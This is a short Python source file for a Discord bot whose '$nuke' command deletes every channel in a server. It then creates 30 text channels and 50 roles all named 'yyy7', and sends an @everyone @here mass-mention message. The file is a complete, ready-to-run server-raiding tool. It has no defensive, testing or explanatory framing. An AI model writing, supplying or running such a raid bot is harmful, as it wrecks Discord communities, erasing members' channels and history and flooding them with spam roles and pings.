import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='$')

@bot.command()
async def nuke(ctx):
    # Delete all channels
    for channel in ctx.guild.channels:
        await channel.delete()

    # Create 30 channels
    for _ in range(30):
        await ctx.guild.create_text_channel(name="yyy7")

    # Create 50 roles
    for _ in range(50):
        await ctx.guild.create_role(name="yyy7")

    # Send a mass message mentioning everyone
    await ctx.send("@everyone @here yyy7")

bot.run("TOKEN")
